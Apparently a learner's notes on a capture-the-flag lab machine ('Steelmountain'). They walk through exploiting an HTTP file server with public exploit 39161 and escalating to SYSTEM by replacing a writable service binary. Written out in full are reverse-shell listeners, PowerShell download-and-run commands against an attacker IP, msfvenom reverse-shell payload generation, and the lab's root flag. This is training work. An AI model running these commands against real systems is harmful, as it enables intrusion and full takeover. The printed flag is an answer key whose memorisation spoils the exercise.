## this is the last part to the Steelmountain machine where the aim is to exploit the same vulnerability
        ## but with a diff method aka without metsploit

#powershell and WinPEAS will be used to enumerate what we can do with the system + how to exploit and access it
#exploit to use = the one found on the epxloit-db page: https://www.exploit-db.com/exploits/39161

#I downloaded the above file (39161.py and moved it to the same directory as this note)
#there was a note that both a web server and nc listener would have to be active simultaneously
        #from what I have learned bfore, a web server could be set up using:
        # python -m SimpleHTTPServer
#further, it said a netcat sttic binary is required on the system which I am quite sure I do not already have
#so I proceeded to install this from git
#finally, I had to run the exploit twice:
        #1 --> the netcat binary is pulled to the system
        #2 --> paylaod should be executed + callback should be 'gained'



#directory of my winPEAS = /home/kali/tools/PEASS-ng/winPEAS



### THE METHOD ###
#1 after downloading the exploit, I modified it so it had my IP addrees and port I wanted to listen to:
        #(10.11.59.68 + 4442)

(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ nano 39161.py

#2 apparently: "a full install of Kali provides the Netcat Windows binary in the /usr/share/windows-resources/binaries/nc.exe directory"
        #meaning I would not have to download this, merely set up a Python SimpleHTTPServer:
(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ python -m SimpleHTTPServer 80                                                                       1 ⨯
Serving HTTP on 0.0.0.0 port 80 ...

(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ nc -nlvp 4442
listening on [any] 4442 ...

(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ python 39161.py 10.10.196.240 8080

#HOWEVER I kept getting these error messages:
10.10.196.240 - - [02/Feb/2022 12:35:07] code 404, message File not found
10.10.196.240 - - [02/Feb/2022 12:35:07] "GET /nc.exe HTTP/1.1" 404 -
10.10.196.240 - - [02/Feb/2022 12:35:07] code 404, message File not found
10.10.196.240 - - [02/Feb/2022 12:35:07] "GET /nc.exe HTTP/1.1" 404 -

#SOLUTION = change directory where python HTTP server was being hosted:
(kali㉿kali)-[/usr/share/windows-resources/binaries]
└─$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.196.240 - - [02/Feb/2022 12:41:27] "GET /nc.exe HTTP/1.1" 200 -
10.10.196.240 - - [02/Feb/2022 12:41:27] "GET /nc.exe HTTP/1.1" 200 -
10.10.196.240 - - [02/Feb/2022 12:41:27] "GET /nc.exe HTTP/1.1" 200 -
10.10.196.240 - - [02/Feb/2022 12:41:27] "GET /nc.exe HTTP/1.1" 200 -

(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ python 39161.py 10.10.196.240 8080

┌──(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ python 39161.py 10.10.196.240 8080

(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ nc -nlvp 4442
listening on [any] 4442 ...
connect to [10.11.59.68] from (UNKNOWN) [10.10.196.240] 49248
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>

#I got a shell:) so next is to use winPEAS to escalate privileges:
#(using powershell - c "")

#after looking aorund for a bit, I found the directory with the right winPEAs:
(kali㉿kali)-[~/…/winPEASexe/binaries/x64/Release]
└─$ ls
winPEASx64.exe

#so i copied this file into the directory where I hosted my httpserver, and renamed it winpeas.exe
#this worked
 powershell -c "Invoke-WebRequest -OutFile winPEAS.exe http://<attacker_ip>/winPEAS.exe"

#next I executed it:
C:\Users\bill\Desktop>winPEAS.exe
winPEAS.exe
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD

             *((,.,/((((((((((((((((((((/,  */
      ,/*,..*((((((((((((((((((((((((((((((((((,
    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*
    ((((((((((((((((**********/########## .(* ,(((((((
    (((((((((((/********************/####### .(. (((((((
    ((((((..******************/@@@@@/***/###### ./(((((((
    ,,....********************@@@@@@@@@@(***,#### .//((((((
    , ,..********************/@@@@@%@@@@/********##((/ /((((    
    ..((###########*********/%@@@@@@@@@/************,,..((((
    .(##################(/******/@@@@@/***************.. /((
    .(#########################(/**********************..*((    
    .(##############################(/*****************.,(((
    .(###################################(/************..(((
    .(#######################################(*********..(((    
    .(#######(,.***.,(###################(..***.*******..(((
    .(#######*(#####((##################((######/(*****..(((
    .(###################(/***********(##############(...(((    
    .((#####################/*******(################.((((((
    .(((############################################(..((((
    ..(((##########################################(..(((((
    ....((########################################( .(((((
    ......((####################################( .((((((
    (((((((((#################################(../((((((
 	(((((((((/##########################(/..((((((
              (((((((((/,.  ,*//////*,. ./(((((((((((((((.
                 (((((((((((((((((((((((((((((/ 


#next step is aparently to generate payload with msfvenom and then pull it to the system using powershell
����������  Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
    File Permissions: bill [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
    Advanced SystemCare Service

#^^this is the part were interested in
        #looking at a walkthrough there is a way to search for it:
        wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """


#1 = check the [rpcess can actually be stopped/started:
C:\Users\bill\Desktop>sc qc AdvancedSystemCareService9
sc qc AdvancedSystemCareService9
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        LOAD_ORDER_GROUP   : System Reserved
        TAG                : 1
        DISPLAY_NAME       : Advanced SystemCare Service 9
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

#2 = check if we have permission to start/stop:
C:\Program Files (x86)\IObit>icacls "advanced SystemCare"
icacls "advanced SystemCare"
advanced SystemCare STEELMOUNTAIN\bill:(I)(OI)(CI)(RX,W)
                    NT SERVICE\TrustedInstaller:(I)(F)
                    NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                    NT AUTHORITY\SYSTEM:(I)(F)
                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                    BUILTIN\Users:(I)(RX)
                    BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                    CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files

        #I do

#3 = create payload 
(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.59.68 LPORT=5555 -f exe > advancing.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes

        #3b - I believe its once again necessary to move this to the same directory as that of the httpserver before uploading it to the reverse shell
        
(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.59.68 LPORT=5555 -e x86/shikata_ga_nai -f exe -o Advancing.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)  
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: Advancing.exe

┌──(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ cp Advancing.exe /usr/share/windows-resources/binaries/Advancing.exe
cp: cannot create regular file '/usr/share/windows-resources/binaries/Advancing.exe': Permission denied

┌──(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ sudo !!                                                                                             1 ⨯

┌──(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ sudo cp Advancing.exe /usr/share/windows-resources/binaries/Advancing.exe                           1 ⨯
[sudo] password for kali: 


#uploaded the payload
C:\Program Files (x86)\IObit\Advanced SystemCare>powershell -c "Invoke-WebRequest -OutFile ASCService.exe http://10.11.59.68/Advancing.exe"
powershell -c "Invoke-WebRequest -OutFile Advancing.exe http://10.11.59.68/Advancing.exe"

C:\Program Files (x86)\IObit\Advanced SystemCare>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Program Files (x86)\IObit\Advanced SystemCare
 
02/02/2022  11:34 AM    <DIR>          .
02/02/2022  11:34 AM    <DIR>          ..
12/28/2015  12:48 PM            64,800 About.dll
07/27/2016  10:24 AM           310,560 About.exe
09/26/2019  07:18 AM            21,506 ActionCenter2.log
01/07/2016  05:13 PM         2,254,624 ActionCenterDownloader.exe
02/02/2022  11:34 AM            73,802 Advancing.exe

#stopped + started the service:
sc stop AdvancedSystemCareService9

C:\Program Files (x86)\IObit\Advanced SystemCare>powershell -c "Invoke-WebRequest -OutFile ASCService.exe http://10.11.59.68/Advancing.exe"

sc start AdvancedSystemCareService9


#and we got a root shell on our listening port:)
(kali㉿kali)-[~]
└─$ nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.11.59.68] from (UNKNOWN) [10.10.241.25] 49240
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>woami
woami
'woami' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>



### For reference with the 2 doff shells: ###
#nc on port 4442
C:\Program Files (x86)\IObit\Advanced SystemCare>cd \Users\Administrator
cd \Users\Administrator
Access is denied.

#nc on port 5555:
C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80



Starting to feel sliiiightly more comfortable with metasploit :)